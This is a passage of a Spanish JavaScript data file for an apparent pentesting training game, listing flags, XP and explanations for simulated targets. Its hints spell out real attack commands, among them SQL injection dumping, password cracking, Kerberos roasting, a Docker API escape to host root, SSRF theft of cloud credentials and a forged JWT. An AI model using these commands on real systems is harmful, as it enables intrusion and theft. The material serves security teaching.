/* ═══════════════════════════════════════════════════════════════
   game-data.js — Registro de flags, logros y rangos.
   Esta capa NO controla la simulación: solo la observa. Cualquier
   comando real que produzca una cadena CQ{...} en su salida activa
   una flag automáticamente, sin importar el camino que tomaste
   para llegar a ella.
   ═══════════════════════════════════════════════════════════════ */
(function (global) {
  'use strict';

  /* ───────────────────────────────────────────────
     REGISTRO DE FLAGS — cada CQ{...} posible en el juego
     ─────────────────────────────────────────────── */
  const FLAG_REGISTRY = {
    // ── Lantern ──
    'CQ{c0mm3nts_l34k_p4th5}': {
      box: '10.10.14.22', xp: 25, name: 'Ruta oculta en comentarios HTML',
      exp: 'Los comentarios HTML olvidados en producción son una fuente clásica de information disclosure. Aquí revela la ruta real del panel de administración.',
    },
    'CQ{sql1_g0ts_th3_h4sh3s}': {
      box: '10.10.14.22', xp: 30, name: 'Base de datos volcada vía SQLi',
      exp: 'sqlmap automatiza la detección y explotación de inyección SQL. --forms detecta formularios automáticamente, --dump extrae los datos.',
    },
    'CQ{p4ssw0rd_1s_n3v3r_54f3}': {
      box: '10.10.14.22', xp: 30, name: 'Hash MD5 crackeado',
      exp: '"password" sigue siendo de las contraseñas más usadas del mundo. MD5 es rápido de crackear porque no está diseñado para contraseñas.',
    },
    'CQ{ssh_4cc3ss_gr4nt3d}': {
      box: '10.10.14.22', xp: 20, name: 'user.txt — acceso SSH conseguido',
      exp: 'Con credenciales válidas, SSH da una shell interactiva completa. Este es el "user flag" clásico: acceso inicial conseguido.',
    },
    'CQ{gtf0b1ns_f1nd_r00t}': {
      box: '10.10.14.22', xp: 40, name: 'root.txt — privesc vía GTFOBins',
      exp: 'GTFOBins documenta binarios legítimos que, mal configurados en sudoers, permiten escapar a una shell con privilegios. find, vim, less, awk... decenas pueden dar root.',
    },
    'CQ{b4ckup_l34k_w3b_z1p}': {
      box: '10.10.14.22', xp: 15, name: 'Backup .zip expuesto en la web',
      exp: 'Los backups olvidados en el docroot son oro para un atacante: suelen contener configuraciones con credenciales. Un simple fuzzing de rutas lo destapa.',
    },
    // ── Ironframe ──
    'CQ{k3rbrut3_us3r_3num}': {
      box: '10.10.15.40', xp: 25, name: 'Usuarios del dominio enumerados',
      exp: 'Kerbrute abusa de que Kerberos responde distinto a un usuario válido vs inválido durante la preautenticación, sin credenciales ni bloquear cuentas.',
    },
    'CQ{4srep_r04st1ng_w0rks}': {
      box: '10.10.15.40', xp: 30, name: 'Hash AS-REP capturado',
      exp: 'Un usuario con la preautenticación Kerberos deshabilitada permite pedir su ticket sin conocer la contraseña — el ticket cifrado se crackea offline.',
    },
    'CQ{summ3r2023_w34k_svc}': {
      box: '10.10.15.40', xp: 30, name: 'Contraseña de cuenta de servicio',
      exp: 'Las cuentas de servicio son objetivo habitual porque rara vez rotan contraseña, aunque cumplan requisitos de complejidad.',
    },
    'CQ{bl00dh0und_g3n3r1c4ll}': {
      box: '10.10.15.40', xp: 35, name: 'Ruta de ataque encontrada en AD',
      exp: 'GenericAll sobre un grupo significa control total: puedes añadir usuarios a ese grupo. Un error de configuración típico en entornos AD reales.',
    },
    'CQ{d0m41n_4dm1n_pwn3d}': {
      box: '10.10.15.40', xp: 35, name: 'Domain Admin obtenido',
      exp: 'De usuario de dominio normal a Domain Admin: enumeración → AS-REP Roasting → cracking → abuso de ACL. Así se ven los ataques reales contra AD.',
    },
    'CQ{k3rb3r04st_tgs_cr4ck3d}': {
      box: '10.10.15.40', xp: 25, name: 'TGS de servicio crackeado (Kerberoasting)',
      exp: 'Cualquier cuenta con un SPN puede ser kerberoasteada: su TGS está cifrado con su contraseña y se crackea offline. Las cuentas de servicio con contraseñas débiles caen en minutos.',
    },
    'CQ{w1nr_m_sh3ll}': {
      box: '10.10.15.40', xp: 20, name: 'Shell WinRM en servidor web',
      exp: 'WinRM (5985) es la vía de administración remota de Windows por defecto. Con credenciales válidas de una cuenta remota, evil-winrm da una shell PowerShell directamente.',
    },
    // ── Fracture ──
    'CQ{jwt_1ssu3d_succ3ssfully}': {
      box: '10.10.17.30', xp: 15, name: 'Token JWT obtenido',
      exp: 'JWT tiene 3 partes separadas por puntos: header, payload y firma. El payload va en Base64, no cifrado.',
    },
    'CQ{b4s3_64_1s_n0t_3ncrypt10n}': {
      box: '10.10.17.30', xp: 20, name: 'Estructura del JWT expuesta',
      exp: 'Base64 es una codificación, no un cifrado. La seguridad depende ÚNICAMENTE de que el servidor verifique la firma correctamente.',
    },
    'CQ{4lg_n0n3_1s_4lw4ys_d4ng3r0us}': {
      box: '10.10.17.30', xp: 35, name: 'Bypass de autenticación JWT',
      exp: 'Si una librería JWT acepta alg:none, cualquiera puede forjar tokens válidos sin conocer el secreto. Una de las vulnerabilidades JWT más citadas en OWASP.',
    },
    'CQ{1d0r_ch41n3d_w1th_jwt}': {
      box: '10.10.17.30', xp: 40, name: 'IDOR: datos de admin expuestos',
      exp: 'El endpoint confía en el ID de la URL sin comprobar que pertenezca al usuario autenticado. Encadenado con el bypass JWT, es toma de cuenta completa.',
    },
    'CQ{full_4p1_c0mpr0m1s3}': {
      box: '10.10.17.30', xp: 40, name: 'Compromiso total de la API',
      exp: 'Cadena completa: JWT mal validado → bypass de rol → IDOR → exfiltración de credenciales admin. Las APIs reales casi nunca caen por una sola vulnerabilidad.',
    },
    'CQ{ffuf_f0und_4dm1n_exp0rt}': {
      box: '10.10.17.30', xp: 15, name: 'Ruta /admin/export descubierta por fuzzing',
      exp: 'ffuf y gobuster descubren endpoints que no están documentados. /admin/export responde 401 sin credenciales, pero su sola existencia marca el siguiente paso.',
    },
    // ── Obsidian ──
    'CQ{d0ck3r_2375_n0_4uth}': {
      box: '10.10.16.88', xp: 25, name: 'Docker API abierta explotada',
      exp: 'El puerto 2375 sin TLS equivale a dar acceso root remoto: cualquiera puede crear o montar volúmenes en contenedores del host.',
    },
    'CQ{c0nt41n3r_3sc4p3_r00t}': {
      box: '10.10.16.88', xp: 35, name: 'Escape de contenedor a host real',
      exp: 'Montar / del host dentro de un contenedor con chroot da acceso root al filesystem REAL del host. Una de las formas más directas de container breakout.',
    },
    'CQ{h1dd3n_n3tw0rk_f0und}': {
      box: '10.10.16.88', xp: 30, name: 'Red interna descubierta',
      exp: 'Pivoting clásico: usar una máquina comprometida como puente hacia redes segmentadas, inaccesibles directamente desde fuera.',
    },
    'CQ{p1v0t_sc4n_succ3ss}': {
      box: '10.10.16.88', xp: 35, name: 'Segundo host localizado',
      exp: 'Ese host nunca fue visible en el escaneo inicial porque está en otra red. Solo pivotando a través del host comprometido se puede alcanzar.',
    },
    'CQ{full_ch41n_dock3r_p1v0t_db}': {
      box: '10.10.16.88', xp: 45, name: 'Pivoting completo — base de datos comprometida',
      exp: 'Cadena real de pentest: API expuesta → escape de contenedor → root en host → red interna → pivoting → compromiso de base de datos.',
    },
    'CQ{d0ck3r_3x3c_c0nt41n3r}': {
      box: '10.10.16.88', xp: 20, name: 'docker exec — shell en el contenedor',
      exp: 'docker exec entra en un contenedor en marcha sin crear otro. Es más sigiloso que un run: no deja imágenes ni contenedores nuevos en el daemon.',
    },
    'CQ{1nt3rn4l_sc4n_f0und_db}': {
      box: '10.10.16.88', xp: 20, name: 'Escaneo nmap de la red interna Docker',
      exp: 'Una vez dentro del host, nmap 172.19.0.0/24 revela el segundo host que el escaneo externo jamás pudo ver. La segmentación de red no es una barrera si el atacante ya está dentro.',
    },
    // ── Meltwater (Cloud) ──
    'CQ{ssrf_t0_m3t4d4t4}': {
      box: '10.10.18.11', xp: 20, name: 'SSRF hacia la metadata AWS',
      exp: 'Un endpoint que descarga URLs sin validar IPs internas es un SSRF clásico. La metadata IMDS (169.254.169.254) de AWS nunca debería ser alcanzable.',
    },
    'CQ{1am_cr3ds_3xf1ltr4t3d}': {
      box: '10.10.18.11', xp: 25, name: 'Credenciales IAM robadas',
      exp: 'El SSRF permite leer el perfil de credenciales de la instancia. Con AccessKeyId/SecretAccessKey ya puedes operar AWS desde tu terminal.',
    },
    'CQ{s3_c0nfs_l34k3d_db}': {
      box: '10.10.18.11', xp: 25, name: 'Secretos de DB en bucket S3',
      exp: 'Los buckets S3 acumulan archivos olvidados. scripts/deploy.sh y config/ revelan contraseñas en texto plano — la nube no cifra por ti.',
    },
    'CQ{d3pl0y_scr1pt_s3cr3ts}': {
      box: '10.10.18.11', xp: 25, name: 'Script de deploy con panel interno',
      exp: 'Los scripts de automatización suelen contener URLs internas y tokens hardcodeados. Oro para un pentester.',
    },
    'CQ{m3ltw4t3r_4dm1n_pwn}': {
      box: '10.10.18.11', xp: 30, name: 'Panel de admin comprometido',
      exp: 'Con el token robado del deploy accedes al panel de administración. En entornos reales esto es el final de la cadena: control total de la app.',
    },
    // ── Podshift (Cloud) ──
    'CQ{k8s_ap1_0p3n_rb4c}': {
      box: '10.10.18.12', xp: 25, name: 'API de Kubernetes abierta',
      exp: 'El API server en :6443 no autentica. Un RBAC mal configurado deja enumerar pods a cualquiera con acceso de red.',
    },
    'CQ{s4_t0k3n_fr0m_p0d}': {
      box: '10.10.18.12', xp: 35, name: 'Token de service account en el pod',
      exp: 'Dentro de cada pod vive el token de su service account. "Pod shifting": pasar de la API al contexto del pod te da sus privilegios.',
    },
    'CQ{db_cr3ds_1n_p0d}': {
      box: '10.10.18.12', xp: 30, name: 'Credenciales de DB dentro del pod',
      exp: 'Las aplicaciones en Kubernetes guardan la configuración en archivos (o env) del pod. Leer /app/.env es una mina.',
    },
    'CQ{k8s_s3cr3t_r34d}': {
      box: '10.10.18.12', xp: 40, name: 'Secrets de Kubernetes leídos',
      exp: 'Con el token de despliegue lees los Secrets del clúster. Los secrets son Base64: codificación, no cifrado.',
    },
    'CQ{clust3r_adm1n_4ch13v3d}': {
      box: '10.10.18.12', xp: 45, name: 'Control total del clúster',
      exp: 'El token robado tiene permisos para listar nodos: escalada completa a admin del clúster desde una mera service account.',
    },
    // ── Statefile (Cloud) ──
    'CQ{4rt1f4ct_d1r_f0und}': {
      box: '10.10.18.13', xp: 25, name: 'Directorio de artefactos descubierto',
      exp: 'gobuster/ffuf descubren rutas que el sitio no enlaza. /pipeline/artifacts/ es el clásico directorio abierto de una CI/CD.',
    },
    'CQ{tfst4t3_pl41nt3xt}': {
      box: '10.10.18.13', xp: 40, name: 'tfstate descargado con credenciales',
      exp: 'terraform.tfstate guarda las claves de acceso de la infraestructura en texto plano. Descargarlo sin autenticar es una filtración crítica.',
    },
    'CQ{iac_t3mpl4t3_l34k}': {
      box: '10.10.18.13', xp: 25, name: 'Plantillas IaC filtradas',
      exp: 'Los templates de Terraform revelan la topología de red y el esquema de la cuenta. Siempre revisa los objetos del bucket tras robar credenciales.',
    },
    'CQ{b4ck3nd_st4t3_pr0d}': {
      box: '10.10.18.13', xp: 45, name: 'tfstate de producción con claves admin',
      exp: 'El backend del estado real tiene claves de administración. Una cadena: artefacto abierto → credenciales → acceso admin.',
    },
    'CQ{st4t3f1l3_4dm1n_1ns1ghts}': {
      box: '10.10.18.13', xp: 40, name: 'Infraestructura desplegada enumerada',
      exp: 'Con las claves admin, describe-instances muestra la infra completa. La visibilidad del inventario cloud es el objetivo final del compromiso.',
    },
    // ── Greenhouse (Cloud) ──
    'CQ{r3g1stry_c4t4l0g}': {
      box: '10.10.18.14', xp: 25, name: 'Catálogo del Docker Registry',
      exp: 'Un registry expuesto en :5000 sin auth. El endpoint /v2/_catalog lista los repositorios: el comienzo de la minería de imágenes.',
    },
    'CQ{1m4g3_l4y3r_cr3ds}': {
      box: '10.10.18.14', xp: 45, name: 'Credenciales en las capas de la imagen',
      exp: 'Las imágenes Docker guardan el historial completo por capas. Claves copiadas por error durante un build quedan accesibles para siempre.',
    },
    'CQ{cust0m3r_d4t4_exf1l}': {
      box: '10.10.18.14', xp: 35, name: 'Datos de clientes exfiltrados',
      exp: 'Una vez con credenciales, los buckets listados por la app revelan datos personales sin cifrar. Este es el impacto real de una brecha cloud.',
    },
    'CQ{1am_r0l3_3sc4l4t10n}': {
      box: '10.10.18.14', xp: 50, name: 'Escalada asumiendo un rol IAM',
      exp: 'Si tu identidad puede asumir otro rol (sts assume-role) con más permisos, ya tienes escalada de privilegios en AWS. Las políticas excesivamente amplias son el vector.',
    },
    'CQ{gr33nh0us3_pr0d_s3cr3ts}': {
      box: '10.10.18.14', xp: 70, name: 'Secretos de producción con el rol',
      exp: 'El rol asumido abre el bucket de producción. Cadena completa: registry → capas → credenciales → IAM privesc → secretos.',
    },
    // ── Underflow (Pwn) ──
    'CQ{und3rfl0w_ssh_cr3ds}': {
      box: '10.10.19.11', xp: 20, name: 'Acceso SSH al usuario svc',
      exp: 'Las contraseñas de las cuentas de servicio en rockyou caen en segundos con hydra. El acceso inicial suele ser el eslabón más débil.',
    },
    'CQ{und3rfl0w_str1ngs}': {
      box: '10.10.19.11', xp: 25, name: 'Cadenas del binario reveladas',
      exp: 'strings extrae el texto incrustado del binario: rutas, shell invocados y funciones internas. Reconocimiento estático antes de tocar el exploit.',
    },
    'CQ{und3rfl0w_l34k}': {
      box: '10.10.19.11', xp: 25, name: 'Dirección filtrada por el overflow',
      exp: 'Sin canario ni PIE, un overflow filtra la dirección de retorno. Conocer la dirección es el paso previo a controlar el flujo de ejecución.',
    },
    'CQ{und3rfl0w_sh3ll}': {
      box: '10.10.19.11', xp: 30, name: 'Shell obtenida sobrescribiendo el retorno',
      exp: 'Inyectando la dirección filtrada en el payload, el programa salta a tu código y te da una shell. Buffer overflow clásico, mitigado solo por NX.',
    },
    'CQ{und3rfl0w_r00t}': {
      box: '10.10.19.11', xp: 25, name: 'root.txt — binario SUID explotado',
      exp: 'El binario era SUID root: la shell obtenida ya es root. Los SUID mal configurados con vulnerabilidades son escalada instantánea.',
    },
    // ── Canary-row (Pwn) ──
    'CQ{can4ry_r0w_ssh}': {
      box: '10.10.19.12', xp: 20, name: 'Acceso SSH al usuario svc',
      exp: 'Hydra + rockyou contra la cuenta svc. Siempre empieza por el acceso más barato antes de atacar binarios.',
    },
    'CQ{can4ry_r0w_str1ngs}': {
      box: '10.10.19.12', xp: 25, name: 'Cadenas del binario reveladas',
      exp: 'strings muestra las pistas internas del binario (check_canary, strcpy). Cada símbolo es una pista del plan de ataque.',
    },
    'CQ{can4ry_l34k3d}': {
      box: '10.10.19.12', xp: 35, name: 'Canario filtrado',
      exp: 'El stack canary se filtra cuando el programa termina por stack smashing. Filtrar el canario es el primer paso del bypass.',
    },
    'CQ{can4ry_byp4ss}': {
      box: '10.10.19.12', xp: 45, name: 'Canary incluido y bypass completado',
      exp: 'Repitiendo el canario en el payload, la mitigación no detecta el overflow y el retorno se sobrescribe. Así se evade una de las protecciones más comunes.',
    },
    'CQ{can4ry_r0w_r00t}': {
      box: '10.10.19.12', xp: 50, name: 'root.txt — canary bypaseado',
      exp: 'El SUID root cae cuando el overflow llega a buen término. Mitigaciones ralentizan, no detienen, a un atacante decidido.',
    },
    // ── Formatstr (Pwn) ──
    'CQ{fmtstr_ssh}': {
      box: '10.10.19.13', xp: 20, name: 'Acceso SSH al usuario svc',
      exp: 'Fuerza bruta de contraseña de la cuenta svc contra rockyou. El usuario con contraseña débil es la puerta de entrada.',
    },
    'CQ{fmtstr_str1ngs}': {
      box: '10.10.19.13', xp: 25, name: 'Cadenas del binario reveladas',
      exp: 'El binario imprime directamente lo que recibe: strings confirma que el formato se usa sin sanear. printf(input) es la vulnerabilidad.',
    },
    'CQ{fmtstr_l34k}': {
      box: '10.10.19.13', xp: 35, name: 'Filtrado de la pila con %p',
      exp: 'Los especificadores %p/%x imprimen contenido del stack. Cada uno consume un argumento real, filtrando direcciones de memoria.',
    },
    'CQ{fmtstr_s3cr3t}': {
      box: '10.10.19.13', xp: 45, name: 'Secreto leído con %s',
      exp: '%s interpreta el argumento como puntero a cadena y lee la memoria apuntada. Format string permite LECTURA (y con %n, escritura) arbitraria.',
    },
    'CQ{fmtstr_r00t}': {
      box: '10.10.19.13', xp: 50, name: 'root.txt — format string explotada',
      exp: 'El secreto leído desbloquea el modo mantenimiento del SUID. Una simple printf mal escrita escala a root.',
    },
    // ── Retlibc (Pwn) ──
    'CQ{r3tl1bc_ssh}': {
      box: '10.10.19.14', xp: 20, name: 'Acceso SSH al usuario svc',
      exp: 'La cuenta svc cae con hydra. El acceso local es imprescindible para trabajar con el binario.',
    },
    'CQ{r3tl1bc_str1ngs}': {
      box: '10.10.19.14', xp: 25, name: 'Cadenas del binario reveladas',
      exp: 'strings muestra system y /bin/sh: existen en el binario o en libc. Con NX activo, son la clave para ret2libc.',
    },
    'CQ{r3tl1bc_l34k}': {
      box: '10.10.19.14', xp: 40, name: 'Dirección de libc filtrada',
      exp: 'El leak de una dirección resuelve la base de libc (ASLR). Sin PIE, los gadgets del propio binario están en direcciones fijas.',
    },
    'CQ{r3tl1bc_r0p}': {
      box: '10.10.19.14', xp: 60, name: 'ROP chain ejecutada',
      exp: 'pop rdi; ret → /bin/sh → system. Reutilizar código ya cargado (libc) evita NX: eso es ret2libc, la base del ROP moderno.',
    },
    'CQ{r3tl1bc_r00t}': {
      box: '10.10.19.14', xp: 80, name: 'root.txt — ret2libc completado',
      exp: 'Las tres mitigaciones modernas (ASLR, NX, canary) no bastan si puedes filtrar y encadenar gadgets. ROP es la técnica pwn por excelencia.',
    },
    // ── Airgap (Wireless) ──
    'CQ{4irg4p_r3c0n}': {
      box: '10.10.20.11', xp: 20, name: 'Red Wi-Fi localizada',
      exp: 'airodump-ng lista las redes visibles con su BSSID, canal y cifrado. El reconocimiento inalámbrico empieza siempre aquí.',
    },
    'CQ{4irg4p_h4ndsh4k3}': {
      box: '10.10.20.11', xp: 25, name: 'Handshake WPA2 capturado',
      exp: 'Con airodump escuchando, un deauth (aireplay-ng -0) fuerza la reconexión y captura el handshake de 4 vías. Sin él no hay crackeo.',
    },
    'CQ{4irg4p_psk_cr4ck3d}': {
      box: '10.10.20.11', xp: 30, name: 'PSK crackeada con aircrack-ng',
      exp: 'aircrack-ng prueba diccionarios contra el handshake. Las PSK cortas o de diccionario caen en minutos: elige contraseñas largas y aleatorias.',
    },
    'CQ{4irg4p_h1dd3n_4p}': {
      box: '10.10.20.11', xp: 20, name: 'Red oculta descubierta',
      exp: 'Las redes ocultas solo ocultan el SSID, no el tráfico. Con la PSK de la primera red "protegida" descubres la segunda.',
    },
    'CQ{4irg4p_gu3sts_pwn3d}': {
      box: '10.10.20.11', xp: 30, name: 'Segunda red crackeada',
      exp: 'La red de invitados pensaba ser segura con otra PSK… también en rockyou. La segmentación Wi-Fi debe aislarse, no solo "esconderse".',
    },
    // ── Meshpoint (Wireless) ──
    'CQ{mshpt_r3c0n}': {
      box: '10.10.20.12', xp: 25, name: 'Red WPA2-Enterprise localizada',
      exp: 'Una red con autenticación MGT (Enterprise) usa EAP en vez de PSK: el handshake es distinto y el ataque también.',
    },
    'CQ{mshpt_e4p_h4ndsh4k3}': {
      box: '10.10.20.12', xp: 40, name: 'Handshake EAP capturado',
      exp: 'El reto MSCHAPv2 del handshake EAP se puede crackear offline. Capturar el handshake de una red Enterprise sigue el mismo flujo de deauth.',
    },
    'CQ{mshpt_r4d1us_cr4ck3d}': {
      box: '10.10.20.12', xp: 60, name: 'Credenciales MSCHAPv2 crackeadas',
      exp: 'asleap recupera la contraseña a partir del reto/respuesta MSCHAPv2. El problema no es EAP, es la contraseña débil detrás del RADIUS.',
    },
    'CQ{mshpt_ssh}': {
      box: '10.10.20.12', xp: 40, name: 'Credenciales reutilizadas en SSH',
      exp: 'Las credenciales RADIUS reutilizadas en SSH: el reuso de contraseñas conecta el ataque Wi-Fi con el acceso a sistemas.',
    },
    'CQ{mshpt_r00t}': {
      box: '10.10.20.12', xp: 60, name: 'flag.txt en el servidor',
      exp: 'Con las credenciales del RADIUS entras al servidor. Cadena completa: WPA2-Enterprise → asleap → SSH → flag.',
    },
    // ── Vlanhop (Wireless) ──
    'CQ{vl4nh0p_gu3st_vl4n}': {
      box: '10.10.20.13', xp: 30, name: 'Acceso a la VLAN de invitados',
      exp: 'Tu puerto de acceso solo debería alcanzar la VLAN de invitados. La subinterfaz ya es el primer paso del salto.',
    },
    'CQ{vl4nh0p_1nt3rn4l}': {
      box: '10.10.20.13', xp: 25, name: 'VLAN interna alcanzada (double tagging)',
      exp: 'Enviar tramas con doble etiqueta 802.1Q hace que el trunk reetiquete y el switch envíe la trama a la VLAN interna. Doble etiqueta = salto de VLAN.',
    },
    'CQ{vl4nh0p_f1l3s3rv3r}': {
      box: '10.10.20.13', xp: 30, name: 'Host interno comprometido (SSH)',
      exp: 'Una vez dentro de la VLAN interna, el archivos servidor está expuesto. La credencial de backup cae contra rockyou.',
    },
    'CQ{vl4nh0p_gtf0b1ns}': {
      box: '10.10.20.13', xp: 45, name: 'Privesc en el host interno',
      exp: 'sudo find con NOPASSWD de nuevo: GTFOBins. El segmento "seguro" tenía los mismos errores de siempre.',
    },
    'CQ{vl4nh0p_r00t}': {
      box: '10.10.20.13', xp: 45, name: 'root.txt en la red interna',
      exp: 'De la red de invitados al root de un servidor interno: la segmentación por VLAN no es seguridad si el trunk confía en la etiqueta.',
    },
    // ── Rogue-dhcp (Wireless) ──
    'CQ{r0gu3_m1tm_4ct1v3}': {
      box: '10.10.20.14', xp: 30, name: 'Posición MITM establecida',
      exp: 'ARP spoofing hace creer a la víctima y al gateway que somos nosotros. Todo el tráfico pasa por el atacante.',
    },
    'CQ{r0gu3_ntlmv2_c4ptur3d}': {
      box: '10.10.20.14', xp: 35, name: 'Hash NTLMv2 capturado con responder',
      exp: 'Responder escucha los desafíos de autenticación y captura hashes NTLMv2 de los servicios que intentan autenticarse contra nosotros.',
    },
    'CQ{r0gu3_h4sh_cr4ck3d}': {
      box: '10.10.20.14', xp: 40, name: 'Hash NTLMv2 crackeado',
      exp: 'hashcat -m 5600 contra el hash capturado. Los hashes NTLMv2 con contraseña débil se resuelven en segundos.',
    },
    'CQ{r0gu3_ssh}': {
      box: '10.10.20.14', xp: 30, name: 'Credenciales usadas en SSH',
      exp: 'La contraseña crackeada del hash es la del administrador DHCP. Reuso de credenciales de nuevo: el atacante solo necesita una.',
    },
    'CQ{r0gu3_r00t}': {
      box: '10.10.20.14', xp: 40, name: 'flag.txt — MITM completo',
      exp: 'Cadena clásica de red: ARP spoofing → responder → hashcat → credenciales → acceso. La red interna comprometida desde el "Wi-Fi de invitados".',
    },
  };

  /* ───────────────────────────────────────────────
     PISTAS — una por flag, usadas por el comando "hint"
     ─────────────────────────────────────────────── */
  const FLAG_HINTS = {
    'CQ{c0mm3nts_l34k_p4th5}': 'curl la raíz de la web del objetivo y revisa si hay comentarios HTML con rutas.',
    'CQ{sql1_g0ts_th3_h4sh3s}': 'usa sqlmap -u "URL_DEL_LOGIN" --forms --dump contra la ruta que encontraste en el comentario.',
    'CQ{p4ssw0rd_1s_n3v3r_54f3}': 'usa hashcat -m 0 EL_HASH /home/guillermo/wordlists/rockyou.txt',
    'CQ{ssh_4cc3ss_gr4nt3d}': 'conéctate por ssh admin@IP con la contraseña que acabas de crackear, luego cat user.txt',
    'CQ{gtf0b1ns_f1nd_r00t}': 'ejecuta sudo -l para ver qué puedes correr como root, luego abusa de find con -exec /bin/sh',
    'CQ{b4ckup_l34k_w3b_z1p}': 'fuzzing de rutas: gobuster dir -u http://lantern.htb — o curl directo a /backup.zip',
    'CQ{k3rbrut3_us3r_3num}': 'kerbrute userenum -d DOMINIO /home/guillermo/wordlists/users.txt --dc IP',
    'CQ{4srep_r04st1ng_w0rks}': 'GetNPUsers.py DOMINIO/ -usersfile users.txt -dc-ip IP -request',
    'CQ{summ3r2023_w34k_svc}': 'hashcat -m 18200 EL_HASH_ASREP /home/guillermo/wordlists/rockyou.txt',
    'CQ{k3rb3r04st_tgs_cr4ck3d}': 'GetUserSPNs.py DOMINIO/svc_backup:Summer2023! -dc-ip IP -request y luego hashcat -m 13100 EL_TGS /home/guillermo/wordlists/rockyou.txt',
    'CQ{w1nr_m_sh3ll}': 'con las credenciales de svc_http: crackmapexec winrm IP -u svc_http -p Summer2024! y luego evil-winrm -i IP -u svc_http -p Summer2024!',
    'CQ{bl00dh0und_g3n3r1c4ll}': 'bloodhound-python -u svc_backup -p LA_CONTRASEÑA -d DOMINIO -c All -ns IP',
    'CQ{d0m41n_4dm1n_pwn3d}': 'ssh svc_backup@IP con su contraseña, luego cat flag.txt en su home',
    'CQ{jwt_1ssu3d_succ3ssfully}': 'registra un usuario y haz login contra la API con curl -X POST',
    'CQ{b4s3_64_1s_n0t_3ncrypt10n}': 'copia la parte central del token (entre puntos) y decodifícala con base64 -d',
    'CQ{4lg_n0n3_1s_4lw4ys_d4ng3r0us}': 'forja un token con header {"alg":"none"} y payload {"role":"admin"}, únelos con puntos, y pruébalo en /admin',
    'CQ{1d0r_ch41n3d_w1th_jwt}': 'con tu token de admin, pide /admin/users/1 directamente',
    'CQ{full_4p1_c0mpr0m1s3}': 'usa la api_key robada del usuario 1 contra /admin/export',
    'CQ{ffuf_f0und_4dm1n_exp0rt}': 'ffuf -w wordlist.txt -u http://api.fracture.htb/FUZZ — busca rutas admin/',
    'CQ{d0ck3r_2375_n0_4uth}': 'docker -H IP:2375 ps',
    'CQ{c0nt41n3r_3sc4p3_r00t}': 'docker -H IP:2375 run -v /:/mnt -it alpine chroot /mnt sh',
    'CQ{d0ck3r_3x3c_c0nt41n3r}': 'docker -H IP:2375 exec -it web_frontend sh',
    'CQ{h1dd3n_n3tw0rk_f0und}': 'una vez con shell en el host, ejecuta ip a',
    'CQ{p1v0t_sc4n_succ3ss}': 'una vez dentro del host pivote: nmap 172.19.0.0/24 — o directo mysql -h 172.19.0.5 -u root -p',
    'CQ{1nt3rn4l_sc4n_f0und_db}': 'con la sesión en obsidian: nmap 172.19.0.0/24',
    'CQ{full_ch41n_dock3r_p1v0t_db}': 'una vez conectado a mysql, la flag aparece automáticamente al listar los secretos',
    'CQ{ssrf_t0_m3t4d4t4}': 'curl "http://meltwater.htb/fetch?url=http://169.254.169.254/latest/meta-data/" — el endpoint /fetch descarga por ti',
    'CQ{1am_cr3ds_3xf1ltr4t3d}': 'sigue por /latest/meta-data/iam/security-credentials/<rol> para leer las credenciales IMDS',
    'CQ{s3_c0nfs_l34k3d_db}': 'tras robar las credenciales, aws s3 ls y aws s3 cp s3://meltwater-backups/config/db.env -',
    'CQ{d3pl0y_scr1pt_s3cr3ts}': 'lee s3://meltwater-backups/scripts/deploy.sh — revela el token del panel interno',
    'CQ{m3ltw4t3r_4dm1n_pwn}': 'curl -H "X-Admin-Token: mw4dm1n_t0k3n" http://meltwater.htb:8080/admin',
    'CQ{k8s_ap1_0p3n_rb4c}': 'nmap -sV 10.10.18.12 verá el puerto 6443. kubectl --server http://10.10.18.12:6443 get pods',
    'CQ{s4_t0k3n_fr0m_p0d}': 'kubectl --server http://10.10.18.12:6443 exec -it web-frontend-7b9c4f5d6e -- env',
    'CQ{db_cr3ds_1n_p0d}': 'kubectl --server http://10.10.18.12:6443 exec -it web-frontend-7b9c4f5d6e -- cat /app/.env',
    'CQ{k8s_s3cr3t_r34d}': 'kubectl --server http://10.10.18.12:6443 get secrets y luego get secret deploy-token',
    'CQ{clust3r_adm1n_4ch13v3d}': 'con el token robado: kubectl --server http://10.10.18.12:6443 --token TOKEN get nodes',
    'CQ{4rt1f4ct_d1r_f0und}': 'gobuster dir -u http://statefile.htb — busca /pipeline/artifacts/',
    'CQ{tfst4t3_pl41nt3xt}': 'curl http://statefile.htb/pipeline/artifacts/terraform.tfstate',
    'CQ{iac_t3mpl4t3_l34k}': 'con las claves del tfstate: aws s3 cp s3://iac-templates/vpc.tf -',
    'CQ{b4ck3nd_st4t3_pr0d}': 'aws s3 cp s3://prod-tf-state-bucket/prod/backend.tfstate - (tiene claves ADMIN)',
    'CQ{st4t3f1l3_4dm1n_1ns1ghts}': 'con las claves admin: aws ec2 describe-instances',
    'CQ{r3g1stry_c4t4l0g}': 'curl http://greenhouse.htb:5000/v2/_catalog',
    'CQ{1m4g3_l4y3r_cr3ds}': 'consulta manifests/latest y descarga cada capa con /v2/app/releases/blobs/<digest>',
    'CQ{cust0m3r_d4t4_exf1l}': 'tras obtener las credenciales: aws s3 cp s3://greenhouse-analytics/customers/2024.csv -',
    'CQ{1am_r0l3_3sc4l4t10n}': 'aws iam list-roles y luego aws sts assume-role --role-arn arn:aws:iam::337788551122:role/greenhouse-prod-role',
    'CQ{gr33nh0us3_pr0d_s3cr3ts}': 'con el rol asumido: aws s3 cp s3://greenhouse-prod-secrets/db-master.pem -',
    'CQ{und3rfl0w_ssh_cr3ds}': 'hydra -l svc -P /home/guillermo/wordlists/rockyou.txt ssh://underflow.htb',
    'CQ{und3rfl0w_str1ngs}': 'ssh svc@10.10.19.11 y ejecuta strings authd, checksec authd, objdump -t authd',
    'CQ{und3rfl0w_l34k}': 'ejecuta ./authd con un payload de 200+ caracteres para que filtre la dirección',
    'CQ{und3rfl0w_sh3ll}': 'vuelve a ejecutar ./authd añadiendo la dirección filtrada (7ffd4144e2a0) al final del payload',
    'CQ{und3rfl0w_r00t}': 'el exploit SUID te da shell de root — la flag aparece al completarlo',
    'CQ{can4ry_r0w_ssh}': 'hydra -l svc -P /home/guillermo/wordlists/rockyou.txt ssh://canary-row.htb',
    'CQ{can4ry_r0w_str1ngs}': 'recon del binario: strings/checksec/objdump sobre canary_check',
    'CQ{can4ry_l34k3d}': 'ejecuta ./canary_check con 40+ caracteres para provocar el stack smashing y filtrar el canario (2b3c4d5e)',
    'CQ{can4ry_byp4ss}': 'repite el payload largo incluyendo 2b3c4d5e al inicio',
    'CQ{can4ry_r0w_r00t}': 'con el canary en su sitio, el overflow completa el retorno — flag al final',
